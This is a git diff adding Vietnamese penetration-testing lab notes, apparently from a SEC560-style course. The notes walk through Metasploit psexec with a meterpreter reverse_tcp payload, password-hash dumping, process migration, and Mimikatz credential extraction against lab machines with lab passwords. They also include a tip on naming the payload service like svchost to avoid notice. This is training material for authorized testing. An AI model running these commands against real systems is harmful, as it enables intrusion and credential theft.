@@ -3785,7 +3785,7 @@ Quá trình thiết lập gồm ba phần.
 
 - Lệnh đầu tiên chúng ta sẽ sử dụng để thiết lập Bộ lọc Sự kiện `-Class __EventFilter` với tên là `UPDATER`. Sau đó, truy vấn sẽ tìm kiếm các lần đăng nhập thất bại (ID Sự kiện 4625) trong đó thông tin đăng nhập khớp với fakeuser.
 
-- Phần thứ hai thiết lập trình xử lý dữ liệu, hay nói cách khác là xử lý khi bộ lọc khớp. Trong trường hợp này, các kết quả khớp với UPDATERbộ lọc sẽ chạy tải trọng của chúng ta nằm tại `C:\Users\sec560\Desktop\payload.exe`.
+- Phần thứ hai thiết lập trình xử lý dữ liệu, hay nói cách khác là xử lý khi bộ lọc khớp. Trong trường hợp này, các kết quả khớp với UPDATERbộ lọc sẽ chạy payloads của chúng ta nằm tại `C:\Users\sec560\Desktop\payload.exe`.
 
 - Bước cuối cùng thiết lập liên kết để tìm kiếm tác nhân kích hoạt và chạy trình tiêu thụ (payload) của chúng ta.
 
@@ -3852,4 +3852,294 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filt
 ## Phần kết luận
 
 Chúng tôi đã sử dụng nhiều phương pháp khác nhau để duy trì quyền truy cập vào hệ thống Windows. Phương pháp bạn sử dụng phụ thuộc vào cấp độ quyền truy cập và cách bạn chọn để ẩn mình. Duy trì quyền truy cập thông qua việc kiên trì là một phần rất quan trọng của kiểm thử xâm nhập. Việc phải nỗ lực rất nhiều để giành được quyền truy cập rồi lại đánh mất nó là điều vô cùng khó chịu đối với bất kỳ người kiểm thử nào!
+
+# Lab 3.4. MSF psexec, hashdumping và Mimikatz
+
+## Mục tiêu
+
+- Sử dụng mô-đun khai thác Metasploit psexecđể triển khai payloads Meterpreter lên máy tính Windows mục tiêu bằng phiên SMB đã được xác thực.
+
+- Để khám phá khả năng của Meterpreter trong việc giành quyền truy cập và trích xuất mã băm từ máy mục tiêu.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+- Windows 10.
+
+Bạn có thể ping địa chỉ 10.130.10.25 từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 10.130.10.25
+```
+
+![alt text](IMG/LAB3/LAB3.4/image.png)
+
+## Hướng dẫn thực hành từng bước
+
+### 1. Khởi chạy Metasploit
+
+```bash
+msfconsole
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-1.png)
+
+Bây giờ chúng ta hãy chọn mô-đun `psexec` khai thác từ Metasploit, mà chúng ta có thể sử dụng để khiến mục tiêu chạy payload của Metasploit:
+
+```bash
+use exploit/windows/smb/psexec
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-2.png)
+
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+Tiếp theo, chúng ta cần cho Metasploit biết mục tiêu mà nó nên tấn công `psexec`, cụ thể là Web01 `10.130.10.25`.
+
+```bash
+set RHOSTS 10.130.10.25
+```
+
+Bây giờ chúng ta cần thiết lập `LHOST`, nơi mà `reverse_tcpstager` sẽ kết nối trở lại. Hãy đặt nó thành giao diện `tun0` của bạn:
+
+```bash
+set LHOST tun0
+```
+
+Hãy cấu hình mô-đun khai thác của bạn `psexec` với tên miền là `hiboxy`, tên người dùng là `bgreen` và mật khẩu là `Password1`. Người dùng `hiboxy\bgreen` nằm trong nhóm quản trị viên của máy này.
+
+```bash
+set SMBUser bgreen
+set SMBDomain hiboxy
+set SMBPass Password1
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-3.png)
+
+Như chúng ta đã thấy, `show options` hình ảnh hiển thị các thiết lập chính cho các mô-đun Metasploit. Nhưng có hàng tá biến bổ sung cho hầu hết các mô-đun có sẵn thông qua cài đặt nâng cao của chúng. Chúng ta có thể xem các tùy chọn này bằng cách chạy lệnh `show advanced`. Hãy thử xem.
+
+```bash
+show advanced
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-4.png)
+
+![alt text](IMG/LAB3/LAB3.4/image-5.png)
+
+![alt text](IMG/LAB3/LAB3.4/image-6.png)
+
+Ở đây, chúng ta có thể thấy nhiều tùy chọn cho phép chúng ta chỉ định những thứ như cổng máy khách cục bộ (`CPORT`) để sử dụng khi khởi chạy một cuộc tấn công, một chỉ báo về việc có tạo một dịch vụ thường trực sẽ chạy mỗi khi hệ thống khởi động hay không để chúng ta tự động nhận được phiên Meterpreter được gửi lại khi hệ thống khởi động (`SERVICE_PERSIST`), và một thiết lập của `SERVICE_FILENAME`. Biến này có thể được đặt thành một tên mà tệp payloads sẽ được ghi vào trên máy mục tiêu để dịch vụ có thể thực thi nó. Một lần nữa, theo mặc định, `SERVICE_FILENAME` là một chuỗi giả ngẫu nhiên. Để tinh tế hơn, chúng ta có thể muốn thay đổi nó thành một cái gì đó có nhiều khả năng được mong đợi trên máy mục tiêu, chẳng hạn như svchost.
+
+Tạm thời hãy bỏ qua những lựa chọn này. Chuỗi ký tự giả ngẫu nhiên và thời điểm cài đặt khiến cho khả năng hai dịch vụ có cùng tên được cài đặt cùng lúc là rất thấp.
+
+Trước khi tiến hành tấn công, hãy xác nhận các thiết lập đã chính xác bằng cách chạy lệnh này show options. Dưới đây là các tùy chọn cho cuộc tấn công.
+
+```bash
+show options
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-8.png)
+
+### 2. Phát động cuộc tấn công
+
+Trong cửa sổ dòng lệnh Metasploit, hãy tiến hành cuộc tấn công:
+
+```bash
+run
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-9.png)
+
+> Chú ý ở đậy có thể gặp lỗi, nhưng lỗi đó là lỗi `Đây là lỗi máy 10.130.10.25 bị mất secure channel với domain HIBOXY. Cách fix chuẩn là rejoin domain hoặc repair secure channel.` Bạn chỉ cần remove và join lại domain là xong, còn tài khoản admin đê join lại Domain thì tùy thuộc vào `Lab2.1`.
+
+![alt text](IMG/LAB3/LAB3.4/image-10.png)
+
+Bạn sẽ thấy meterpreter >lời nhắc bây giờ.
+
+Hãy chú ý đến kết quả hiển thị trên màn hình. Chúng ta có thể thấy các hành động sau đây được thực hiện bởi Metasploit:
+
+- 1: Metasploit tự động khởi động một trình xử lý ngược lắng nghe trên cổng cục bộ `4444`, chờ kết nối `reverse_tcp` được thiết lập lại. Đây `LPORT` là giá trị mặc định `4444` cho hầu hết các payload của Metasploit. Chúng ta có thể thay đổi điều đó bằng cách đặt `LPORT` giá trị khác.
+
+- 2: Sau đó, nó kết nối với máy chủ mục tiêu.
+
+- 3: Nó xác thực với máy mục tiêu với tư cách người dùng bgreen.
+
+- 4: Sau đó, nó nhận ra rằng máy mục tiêu đã cài đặt PowerShell.
+
+- 5: Sau đó, nó thực thi tải trọng bằng cách khởi động dịch vụ.
+
+- 6: Nếu dịch vụ khởi động thành công, nó sẽ gửi giai đoạn đó đến đích (tải lên bằng trình xử lý giai đoạn).
+
+- 7: Và cuối cùng, chúng ta có một phiên Meterpreter.
+
+### 3. Meterpreter
+
+Bây giờ chúng ta đang ở trong phiên Meterpreter. Để xem tài khoản người dùng mà chúng ta đang sử dụng, hãy chạy lệnh sau `getuid`:
+
+![alt text](IMG/LAB3/LAB3.4/image-11.png)
+
+Chúng tôi có quyền `SYSTEM` cục bộ trên máy. Vì vậy, chúng tôi bắt đầu với người dùng quản trị (`bgreen`) và sử dụng thông tin đăng nhập để thực thi mã cục bộ `SYSTEM` thông qua `psexec`.
+
+Giờ, với phiên Meterpreter của bạn, hãy lấy các mã băm từ mục tiêu. Chúng ta sẽ sử dụng mô-đun `post/windows/gather/smart_hashdump` để trích xuất mã băm mật khẩu từ hệ thống từ xa. Mô-đun này rất thông minh và sẽ trích xuất mã băm mật khẩu khác nhau tùy thuộc vào vai trò của hệ thống mục tiêu. Nếu mục tiêu là bộ điều khiển miền, nó sẽ lấy mật khẩu theo cách khác và từ một vị trí khác. Chúng ta sẽ thảo luận chi tiết hơn về điều này sau trong khóa học này.
+
+Hãy xem mô-đun `smart_hashdump` bằng lệnh sau `info`.
+
+```bash
+info post/windows/gather/smart_hashdump
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-12.png)
+
+Thực thi mô-đun `smart_hashdump`.
+
+```bash
+run post/windows/gather/hashdump
+```
+
+> Lệnh này có thể mất một phút. Việc lấy mã băm mật khẩu mất một chút thời gian. Có thể mất một hoặc hai phút để lấy được mã băm mật khẩu.
+
+![alt text](IMG/LAB3/LAB3.4/image-13.png)
+
+
+Như vậy là chúng ta đã lấy được thành công các mã băm từ máy mục tiêu, sau đó chúng ta có thể giải mã hoặc sử dụng chúng trong một cuộc tấn công `pass-the-hash`, chúng ta sẽ đề cập chi tiết cả hai phương pháp này ở phần sau.
+
+### 4. Thiết lập Mimikatz (Kiwi)
+
+Chuyển sang Windows. Chúng ta sẽ tải một số thông tin đăng nhập của người dùng miền vào bộ nhớ. Giả sử người dùng đó bgreenđã đăng nhập vào hệ thống.
+
+Mở cửa sổ lệnh CMD và chạy:
+
+```bash
+runas /user:hiboxy\bgreen /netonly notepad.exe
+# Khi được yêu cầu, hãy nhập mật khẩu Password1
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-14.png)
+
+Thao tác này sẽ mở một cửa sổ Notepad mới với quyền quản trị viên là `hiboxy\bgreen`.
+
+### 5. Chạy Mimikatz
+
+Bây giờ chúng ta hãy nhắm mục tiêu vào hệ thống Windows. Chúng ta sẽ thực hiện việc này trên hệ thống Windows cục bộ để tránh làm sập hệ thống mục tiêu. Mimikatz khá an toàn, nhưng chúng ta cần chuyển sang tiến trình Hệ thống để thực hiện việc này. Nếu nhiều sinh viên cùng lúc chuyển sang một tiến trình hệ thống nhạy cảm, nó có thể gây ra các vấn đề về tính ổn định trên máy chủ.
+
+Thoát khỏi phiên Meterpreter hiện có (không phải Metasploit) bằng cách gõ lệnh `exit`.
+
+```bash
+exit
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-15.png)
+
+Chúng ta cần thay đổi mục tiêu. Hãy chắc chắn rằng bạn đã thay đổi `WINDOWS_ETHERNET0_ADDRESS` sang địa chỉ IP của máy ảo Windows (KHÔNG phải địa chỉ bắt đầu bằng 10.254.25X.X).
+
+```bash
+set LHOST eth0
+set SMBUSER sec560
+set SMBPASS 1234@abcd
+unset SMBDomain
+set RHOSTS 10.130.10.25
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-18.png)
+
+> Lưu ý rằng tùy chọn SMBDomain sử dụng unset, chứ không phải set. Ngoài ra, nếu bạn đã thay đổi mật khẩu cho tài khoản `sec560`, hãy sử dụng mật khẩu đó thay thế.
+
+Xác nhận các thiết lập bằng cách chạy lệnh `show options`.
+
+```bash
+show options
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-19.png)
+
+Hãy khai thác hệ thống này.
+
+```bash
+run
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-20.png)
+
+Hãy cùng xem lại phiên làm việc hiện tại bằng cách chạy lệnh này `sysinfo`.
+
+```bash
+sysinfo
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-21.png)
+
+Như chúng ta thấy ở trên, hệ thống mục tiêu là 64-bit, nhưng tiến trình Meterpreter lại là `32-bit`. Để thực hiện tác vụ tiếp theo, chúng ta cần ở trong tiến trình `SYSTEM 64-bit`.
+
+Hãy tìm các tiến trình SYSTEM 64-bit trên mục tiêu bằng lệnh sau `ps`. Chúng ta cần tìm các tiến trình 64-bit (`-A x64`) đang chạy với quyền SYSTEM (`-s`, chữ s viết thường).
+
+```bash
+ps -A x64 -s
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-22.png)
+
+> Mã định danh quy trình sẽ khác nhau: Các ID tiến trình hiển thị ở trên sẽ khác với những gì bạn thấy trên hệ thống của mình.
+
+Như bạn thấy trong kết quả đầu ra ở trên, sẽ có một số tiến trình SYSTEM 64-bit. Chúng ta cần xác định một tiến trình để chuyển đổi sang.
+
+> Di chuyển quy trình: Khi di chuyển dữ liệu, không nên di chuyển vào bất kỳ tiến trình nào có tên là `svchost.exe`. Trong thực tế, khi chọn một tiến trình để di chuyển vào, hãy nghĩ đến những tiến trình ít có khả năng gây ra tác động đáng kể đến hệ thống nếu tiến trình đó gặp sự cố. Một lựa chọn phổ biến là spoolsv(Print Spooler), vì nó không cần thiết trên hầu hết các hệ thống.
+
+Sau đó, chúng ta sẽ chuyển sang một trong các tiến trình SYSTEM 64-bit (`spoolsv.exe`) bằng lệnh sau:
+
+```bash
+migrate -N spoolsv.exe
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-23.png)
+
+Hãy kiểm tra xem Meterpreter của bạn có phải là phiên bản 64-bit hay không bằng cách chạy lệnh bên dưới và phân tích dòng lệnh Meterpreter. Dòng lệnh Meterpreter lúc này sẽ hiển thị như sau `x64`:
+
+```bash
+sysinfo
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-24.png)
+
+Giờ đây, khi đã ở trong tiến trình 64-bit, chúng ta có thể tải `Mimikatz` bằng lệnh sau:
+
+```bash
+load kiwi
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-25.png)
+
+Hãy cùng xem các lệnh mới mà chúng ta có thể sử dụng bằng cách chạy lệnh sau `help`:
+
+```bash
+help
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-26.png)
+
+![alt text](IMG/LAB3/LAB3.4/image-27.png)
+
+Bây giờ chúng ta hãy lấy mật khẩu từ RAM bằng cách chạy lệnh sau:
+
+```bash
+creds_all
+```
+
+![alt text](IMG/LAB3/LAB3.4/image-28.png)
+
+Chúng ta thấy thông tin về người dùng hiện đang đăng nhập (`sec560`). Chúng ta cũng thấy mã băm NT của tài khoản người dùng sec560.
+
+Để hoàn thành bài thực hành này, hãy thoát khỏi phiên Meterpreter của bạn:
+
+```bash
+exit
+```
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã chạy mô-đun `psexec` Metasploit, xem xét các tùy chọn cấu hình và phân tích các hoạt động từng bước của nó để giành quyền thực thi mã trên máy mục tiêu. Chúng ta đã sử dụng payload để `psexec` chạy `meterpreter/reverse_tcp` trên máy mục tiêu với `SYSTEM` quyền cục bộ, sau đó sử dụng quyền này để chiếm thêm các quyền khác và thu thập các mã băm thông qua mô-đun `post/windows/gather/smart_hashdump`. Ngoài ra, chúng ta có thể thu thập thông tin đăng nhập dạng văn bản gốc của người dùng đã đăng nhập bằng Mimikatz (kiwi). Mỗi khả năng này đều rất hữu ích trong một bài kiểm thử xâm nhập.
 
